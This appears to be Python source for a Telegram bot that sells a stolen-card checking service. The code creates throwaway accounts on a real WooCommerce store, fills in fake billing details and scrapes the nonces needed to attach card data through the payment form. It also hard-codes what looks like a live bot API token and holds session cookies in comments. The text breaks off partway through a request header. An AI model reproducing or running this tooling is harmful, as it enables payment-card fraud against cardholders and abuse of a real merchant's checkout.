import requests, re, base64, random, string, time,httpx,uuid, asyncio,json,telebot
from telebot import types
from datetime import datetime, timedelta
from collections import deque
from threading import Thread
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
from keep_alive import keep_alive
keep_alive()
 
## Join Telegram Channel https://t.me/+wij9jAfD7l00NzY1
## @Ownerxxxxx

BOT_API_KEY = '6907232495:AAGWBPq7aMaVqwfsxMpjqPsw1iDvZzoIZK4'
OWNER_ID = 6060534504


bot = telebot.TeleBot(BOT_API_KEY)
AUTHORIZED_USER_IDS = [OWNER_ID]  


user_tasks = {}

# Load premium users from file
def load_premium_users():
    premium_users = {}
    try:
        with open('premium_users.txt', 'r') as file:
            lines = file.readlines()
            for line in lines:
                user_id, expiry_date = line.strip().split(',')
                premium_users[int(user_id)] = datetime.strptime(expiry_date, '%Y-%m-%d')
    except FileNotFoundError:
        pass
    return premium_users

# Save premium users to file
def save_premium_users(premium_users):
    with open('premium_users.txt', 'w') as file:
        for user_id, expiry_date in premium_users.items():
            file.write(f'{user_id},{expiry_date.strftime("%Y-%m-%d")}\n')

premium_users = load_premium_users()
PREMIUM_GROUP_ID = -1001938000028

async def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

async def create_cvv_charge(fullz, session):
    try:
        print(fullz)
        cc, mes, ano, cvv = fullz.split("|")
        bin_info = await get_bin_info(cc[:6])
        user_agent = UserAgent().random
        # await asyncio.sleep(4)
        headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user_agent,
            }

        response = requests.get('https://www.fakemailgenerator.com/', headers=headers)


        mail = await find_between(response.text, '<input id="home-email" type="text" aria-label="..." value="', '" ')
        domain = await find_between(response.text, '<span id="domain">', ' </span>')
        maill = mail + domain
        result1=maill
        # print(result1)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F; _fbp=fb.1.1720161013775.664974316436712926; _wpfuuid=8b94c902-d240-474a-8c19-31592e487944; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-09%2004%3A19%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-09%2004%3A19%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; _gid=GA1.2.586402820.1720500544; mailchimp.cart.current_email=dhetdh@gmail.com; mailchimp_user_previous_email=dhetdh%40gmail.com; mailchimp_user_email=dhetdh%40gmail.com; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F; _ga=GA1.1.1142621130.1720161014; _ga_FMP1TVZD7N=GS1.1.1720500544.3.1.1720501032.0.0.0; sucuri_cloudproxy_uuid_cb717076e=4438eb69f97630f64f283c80f56d13f1; wordpress_test_cookie=WP%20Cookie%20check',
            'priority': 'u=0, i',
            'referer': 'https://smartshieldsecurity.com/wp-login.php?action=logout&redirect_to=https%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2F&_wpnonce=06488b460a',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        result = await session.get('https://smartshieldsecurity.com/my-account/',  headers=headers)
        # woononce = await find_between(result.text, 'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '"')

        soup = BeautifulSoup(result.text, 'html.parser')

        # Find the input element with the id 'woocommerce-register-nonce'
        woononce1 = soup.find('input', {'id': 'woocommerce-register-nonce'})

        # Extract the value of the nonce
        try:
            woononce = woononce1.get('value')
            print(f"Nonce 1 Found")
        except:
            print("Error While Fetching Nonce1")

        

        # soup = BeautifulSoup(result.text, 'html.parser')

        # # Find the nonce input field
        # woononce = soup.find('input', {'name': 'woocommerce-register-nonce'})

        # # Extract the nonce value
        # if woononce:
        #     nonce_value = woononce['value']
        #     print(f"woo: {nonce_value}")
        # else:
        #     print("Nonce input field not found")

        # print('woo',woononce)
        # await asyncio.sleep(1.1)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F; _gid=GA1.2.896933338.1720161014; _fbp=fb.1.1720161013775.664974316436712926; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; _wpfuuid=8b94c902-d240-474a-8c19-31592e487944; mailchimp.cart.current_email=SRFG@GMAIL.COM; mailchimp_user_email=SRFG%40GMAIL.COM; sucuri_cloudproxy_uuid_e54c5f552=43e722f6cbfc50bec2df6cf465f2721a; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2F; _gat_gtag_UA_139285559_1=1; _ga_FMP1TVZD7N=GS1.1.1720161013.1.1.1720161098.0.0.0; _ga=GA1.1.1142621130.1720161014',
            'origin': 'https://smartshieldsecurity.com',
            'priority': 'u=0, i',
            'referer': 'https://smartshieldsecurity.com/my-account/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        data = {
            'email': result1,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://smartshieldsecurity.com/my-account/add-payment-method/',
            'wc_order_attribution_session_start_time': '2024-07-05 06:00:14',
            'wc_order_attribution_session_pages': '7',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': user_agent,
            'mailchimp_woocommerce_newsletter': '1',
            'woocommerce-register-nonce': woononce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        result2 =await session.post('https://smartshieldsecurity.com/my-account/',  headers=headers, data=data)
        # await asyncio.sleep(1.1)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F; _gid=GA1.2.896933338.1720161014; _fbp=fb.1.1720161013775.664974316436712926; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; _wpfuuid=8b94c902-d240-474a-8c19-31592e487944; mailchimp.cart.current_email=SRFG@GMAIL.COM; mailchimp_user_email=SRFG%40GMAIL.COM; sucuri_cloudproxy_uuid_e54c5f552=43e722f6cbfc50bec2df6cf465f2721a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_33ac2e27b0fb75edb77ecc81bae035d4=dghgdhsd%7C1721370778%7Ch6rY8BpsROu12XALn8fmr06KaUwwVITctOo9dO9h9Ae%7Cebce821a80b0d0221203d32dad9e274c6efe50ab091f82cae145e6fd3b3873db; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2F; _gat_gtag_UA_139285559_1=1; _ga_FMP1TVZD7N=GS1.1.1720161013.1.1.1720161159.0.0.0; _ga=GA1.1.1142621130.1720161014',
            'priority': 'u=0, i',
            'referer': 'https://smartshieldsecurity.com/my-account/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        result3 =await session.get('https://smartshieldsecurity.com/my-account/edit-address/',  headers=headers)
        # await asyncio.sleep(1.1)
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F; _gid=GA1.2.896933338.1720161014; _fbp=fb.1.1720161013775.664974316436712926; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; _wpfuuid=8b94c902-d240-474a-8c19-31592e487944; mailchimp.cart.current_email=SRFG@GMAIL.COM; mailchimp_user_email=SRFG%40GMAIL.COM; sucuri_cloudproxy_uuid_e54c5f552=43e722f6cbfc50bec2df6cf465f2721a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_33ac2e27b0fb75edb77ecc81bae035d4=dghgdhsd%7C1721370778%7Ch6rY8BpsROu12XALn8fmr06KaUwwVITctOo9dO9h9Ae%7Cebce821a80b0d0221203d32dad9e274c6efe50ab091f82cae145e6fd3b3873db; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fedit-address%2F; _ga_FMP1TVZD7N=GS1.1.1720161013.1.1.1720161218.0.0.0; _ga=GA1.1.1142621130.1720161014',
            'priority': 'u=0, i',
            'referer': 'https://smartshieldsecurity.com/my-account/edit-address/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        result4 = await session.get('https://smartshieldsecurity.com/my-account/edit-address/billing/',headers=headers)
        soup = BeautifulSoup(result4.text, 'html.parser')
        
        try:
            addnonce = soup.find('input', {'id': 'woocommerce-edit-address-nonce'}).get('value')
            print(f"Nonce 2 Found")
        except:
            print("Error While Fetching Nonce2")

        # print('add',addnonce)
        # await asyncio.sleep(1.1)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F; _gid=GA1.2.896933338.1720161014; _fbp=fb.1.1720161013775.664974316436712926; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; _wpfuuid=8b94c902-d240-474a-8c19-31592e487944; mailchimp.cart.current_email=SRFG@GMAIL.COM; mailchimp_user_email=SRFG%40GMAIL.COM; sucuri_cloudproxy_uuid_e54c5f552=43e722f6cbfc50bec2df6cf465f2721a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_33ac2e27b0fb75edb77ecc81bae035d4=dghgdhsd%7C1721370778%7Ch6rY8BpsROu12XALn8fmr06KaUwwVITctOo9dO9h9Ae%7Cebce821a80b0d0221203d32dad9e274c6efe50ab091f82cae145e6fd3b3873db; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fedit-address%2Fbilling%2F; _gat_gtag_UA_139285559_1=1; _ga_FMP1TVZD7N=GS1.1.1720161013.1.1.1720161268.0.0.0; _ga=GA1.1.1142621130.1720161014',
            'origin': 'https://smartshieldsecurity.com',
            'priority': 'u=0, i',
            'referer': 'https://smartshieldsecurity.com/my-account/edit-address/billing/',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        data = {
            'billing_first_name': mail,
            'billing_last_name': mail,
            'billing_company': '',
            'billing_country': 'US',
            'billing_address_1': '2000 badlwin rd',
            'billing_address_2': '',
            'billing_city': 'ny',
            'billing_state': 'NY',
            'billing_postcode': '10598',
            'billing_phone': '6285294723',
            'billing_email': result1,
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': addnonce,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
        }

        result5 =await session.post(
            'https://smartshieldsecurity.com/my-account/edit-address/billing/',
            # cookies=cookies,
            headers=headers,
            data=data,
            
        )

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F; _gid=GA1.2.896933338.1720161014; _fbp=fb.1.1720161013775.664974316436712926; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; _wpfuuid=8b94c902-d240-474a-8c19-31592e487944; mailchimp.cart.current_email=SRFG@GMAIL.COM; mailchimp_user_email=SRFG%40GMAIL.COM; sucuri_cloudproxy_uuid_e54c5f552=43e722f6cbfc50bec2df6cf465f2721a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_33ac2e27b0fb75edb77ecc81bae035d4=dghgdhsd%7C1721370778%7Ch6rY8BpsROu12XALn8fmr06KaUwwVITctOo9dO9h9Ae%7Cebce821a80b0d0221203d32dad9e274c6efe50ab091f82cae145e6fd3b3873db; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fedit-address%2F; _ga_FMP1TVZD7N=GS1.1.1720161013.1.1.1720161326.0.0.0; _ga=GA1.1.1142621130.1720161014',
            'priority': 'u=0, i',
            'referer': 'https://smartshieldsecurity.com/my-account/edit-address/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        result6 =await session.get('https://smartshieldsecurity.com/my-account/payment-methods/',  headers=headers)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F; _gid=GA1.2.896933338.1720161014; _fbp=fb.1.1720161013775.664974316436712926; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; _wpfuuid=8b94c902-d240-474a-8c19-31592e487944; mailchimp.cart.current_email=SRFG@GMAIL.COM; mailchimp_user_email=SRFG%40GMAIL.COM; sucuri_cloudproxy_uuid_e54c5f552=43e722f6cbfc50bec2df6cf465f2721a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_33ac2e27b0fb75edb77ecc81bae035d4=dghgdhsd%7C1721370778%7Ch6rY8BpsROu12XALn8fmr06KaUwwVITctOo9dO9h9Ae%7Cebce821a80b0d0221203d32dad9e274c6efe50ab091f82cae145e6fd3b3873db; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fpayment-methods%2F; _ga_FMP1TVZD7N=GS1.1.1720161013.1.1.1720161393.0.0.0; _ga=GA1.1.1142621130.1720161014',
            'priority': 'u=0, i',
            'referer': 'https://smartshieldsecurity.com/my-account/payment-methods/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        result7 =await session.get('https://smartshieldsecurity.com/my-account/add-payment-method/',  headers=headers)

       
        try:
            paynonce = await find_between(result7.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            print(f"Nonce 3 Found")
        except:
            print("Error While Fetching Nonce3")

        soup = BeautifulSoup(result7.text, 'html.parser')
        script_tag = soup.find('script', string=re.compile(r'client_token_nonce'))

        if script_tag:
            script_content = script_tag.string

            match = re.search(r'"client_token_nonce":\s*"([^"]+)"', script_content)
            if match:
                client_token_nonce = match.group(1)
                print(f"Nonce 4 Found")
            else:
                print("Error While Fetching Nonce 4")
        else:
            print("Error While Fetching Nonce 4")

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'wordpress_sec_33ac2e27b0fb75edb77ecc81bae035d4=dhdgh%7C1721710986%7CxdZpILm9dubl8tKISdP8soFvxhYdpzyL32vZXe0lFvQ%7Cca643581f681fb038f8d2d571699060985e0f9bc49027618471cb99f22bc1c8e; mailchimp_landing_site=https%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F; _fbp=fb.1.1720161013775.664974316436712926; _wpfuuid=8b94c902-d240-474a-8c19-31592e487944; mailchimp_user_previous_email=dhdgh%40gmail.com; mailchimp_user_email=dhdgh%40gmail.com; wordpress_logged_in_33ac2e27b0fb75edb77ecc81bae035d4=dhdgh%7C1721710986%7CxdZpILm9dubl8tKISdP8soFvxhYdpzyL32vZXe0lFvQ%7Cff4f309218b812d430bff9ff974841fd6f73bc12180cc6cf059f98b777ba8281; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-11%2012%3A15%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; 